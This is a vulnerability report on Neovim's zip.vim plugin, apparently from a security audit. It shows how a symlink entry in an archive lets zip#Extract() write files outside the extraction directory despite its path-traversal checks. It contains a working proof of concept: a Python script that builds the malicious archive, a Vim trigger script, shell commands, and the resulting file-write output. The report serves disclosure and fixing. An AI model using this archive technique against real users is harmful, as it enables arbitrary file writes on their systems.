# 02-zip-extract findings

## Broken invariant

`zip#Extract()` assumes that rejecting raw member names containing `..`, leading slashes / drive roots, and pre-existing target files is enough to keep extraction inside the current working directory. That invariant is false on the default GNU `unzip` path: the sink resolves existing filesystem symlinks in ancestor components, so a member name that passes the string checks (for example `pivot/owned.txt`) can still write outside the extraction root.

There is a second drift in the same path: after extracting a symlink entry used as the pivot, the plugin checks `filereadable(fname)` and reports failure even though the symlink was successfully created. That makes the symlink pivot easy to miss before the second extraction.

## Input -> sink chain

1. `zip#Browse()` lists attacker-controlled archive member names and maps `x` to `zip#Extract()` (`/home/node/workspace/neovim/runtime/autoload/zip.vim:254-279`).
2. `zip#Extract()` reads the selected member name with `getline(".")` (`/home/node/workspace/neovim/runtime/autoload/zip.vim:492-497`).
3. The policy gate only validates the raw string:
   - reject directory entries (`:502-504`)
   - reject `../`-style traversal in the raw/simplified string (`:505-508`)
   - reject absolute paths (`:509-520`)
   - reject overwriting an existing file at the raw relative path (`:521-524`)
4. The sink then builds and executes `unzip -o <zipfile> <target>` on the GNU path (`/home/node/workspace/neovim/runtime/autoload/zip.vim:525-546`).
5. If an earlier extraction created `pivot` as a symlink to `../outside`, extracting `pivot/owned.txt` makes the kernel resolve the destination to `../outside/owned.txt`, outside the working directory.
6. The post-check only tests `filereadable(fname)` (`/home/node/workspace/neovim/runtime/autoload/zip.vim:548-553`), so extracting the symlink pivot itself is misreported as failure even though it succeeds.

## Minimal reproducer

This is self-contained: the archive ships both the symlink pivot and the nested file.

### File contents

```python
import os, stat, zipfile

root = '/tmp/nvim-wiki-zip-nvim'
os.makedirs(f'{root}/extract', exist_ok=True)
os.makedirs(f'{root}/outside', exist_ok=True)

with zipfile.ZipFile(f'{root}/attack.zip', 'w') as zf:
    zi = zipfile.ZipInfo('pivot')
    zi.create_system = 3
    zi.external_attr = (stat.S_IFLNK | 0o777) << 16
    zf.writestr(zi, '../outside')

    fi = zipfile.ZipInfo('pivot/owned.txt')
    fi.create_system = 3
    fi.external_attr = (stat.S_IFREG | 0o644) << 16
    zf.writestr(fi, b'PWNED_FROM_NVIM\\n')
```

```vim
set nomore
set shortmess+=I
set runtimepath^=/home/node/workspace/neovim/runtime
lcd /tmp/nvim-wiki-zip-nvim/extract
call zip#Browse('/tmp/nvim-wiki-zip-nvim/attack.zip')
call cursor(search('^pivot$'), 1)
call zip#Extract()
call cursor(search('^pivot/owned.txt$'), 1)
call zip#Extract()
qa!
```

### Commands

```bash
cat >/tmp/create_zip_poc.py <<'EOF'
import os, stat, zipfile

root = '/tmp/nvim-wiki-zip-nvim'
os.makedirs(f'{root}/extract', exist_ok=True)
os.makedirs(f'{root}/outside', exist_ok=True)

with zipfile.ZipFile(f'{root}/attack.zip', 'w') as zf:
    zi = zipfile.ZipInfo('pivot')
    zi.create_system = 3
    zi.external_attr = (stat.S_IFLNK | 0o777) << 16
    zf.writestr(zi, '../outside')

    fi = zipfile.ZipInfo('pivot/owned.txt')
    fi.create_system = 3
    fi.external_attr = (stat.S_IFREG | 0o644) << 16
    zf.writestr(fi, b'PWNED_FROM_NVIM\n')
EOF

python3 /tmp/create_zip_poc.py
cat >/tmp/repro_zip_extract.vim <<'EOF'
set nomore
set shortmess+=I
set runtimepath^=/home/node/workspace/neovim/runtime
lcd /tmp/nvim-wiki-zip-nvim/extract
call zip#Browse('/tmp/nvim-wiki-zip-nvim/attack.zip')
call cursor(search('^pivot$'), 1)
call zip#Extract()
call cursor(search('^pivot/owned.txt$'), 1)
call zip#Extract()
qa!
EOF

nvim --headless -u NONE -i NONE -n -S /tmp/repro_zip_extract.vim
ls -l /tmp/nvim-wiki-zip-nvim/extract
ls -l /tmp/nvim-wiki-zip-nvim/outside/owned.txt
cat /tmp/nvim-wiki-zip-nvim/outside/owned.txt
```

### Expected vs actual

- **Expected:** the traversal guard should keep all writes under `/tmp/nvim-wiki-zip-nvim/extract`; `pivot/owned.txt` should either be blocked or created only inside that directory.
- **Actual:** the first extraction creates `extract/pivot -> ../outside` but is misreported as failure; the second extraction writes `/tmp/nvim-wiki-zip-nvim/outside/owned.txt` with attacker-controlled contents:

```text
lrwxrwxrwx ... /tmp/nvim-wiki-zip-nvim/extract/pivot -> ../outside
-rw-r--r-- ... /tmp/nvim-wiki-zip-nvim/outside/owned.txt
PWNED_FROM_NVIM
```

## Affected files

- `/home/node/workspace/neovim/runtime/autoload/zip.vim:492-553`
  - `zip#Extract()` reads the selected name, performs string-only validation, and launches the extraction sink.
- `/home/node/workspace/neovim/runtime/autoload/zip.vim:543-546`
  - GNU `unzip` is the primary extraction sink used before any PowerShell fallback.
- `/home/node/workspace/neovim/runtime/doc/pi_zip.txt:36-38`
  - the user-facing contract says the plugin tries to detect path traversal attacks when extracting listed files.
- `/home/node/workspace/neovim/runtime/doc/pi_zip.txt:86-90`
  - GNU `zip`/`unzip` is the preferred and more capable default path, so the vulnerable branch is the normal one.
- `/home/node/workspace/neovim/test/old/testdir/test_plugin_zip.vim:66-72`
  - current tests cover only the normal successful extraction path.
- `/home/node/workspace/neovim/test/old/testdir/test_plugin_zip.vim:236-320`
  - current hardening tests cover leading `-` and raw traversal strings, but not symlink-ancestor resolution.

## Impact / severity

This is an arbitrary file write outside the intended extraction directory on the default GNU `unzip` path. The archive member name crosses from untrusted listing text into a filesystem write sink after only raw-string validation; the code never validates the resolved destination path that the OS will actually open.

Reachability is practical:

- the archive can be self-contained by shipping a symlink pivot plus a nested file, as shown above;
- if the current working directory already contains an attacker-controlled symlinked subdirectory, only a single `x` extraction is needed.

Severity is at least **moderate**:

- impact is outside-directory write with attacker-controlled contents;
- the surface is a default user-facing runtime plugin bound to a single keystroke (`x`) while browsing an untrusted archive;
- the plugin has already received multiple traversal fixes, which makes this sibling variant a clear normalization/use drift rather than an unsupported edge case.
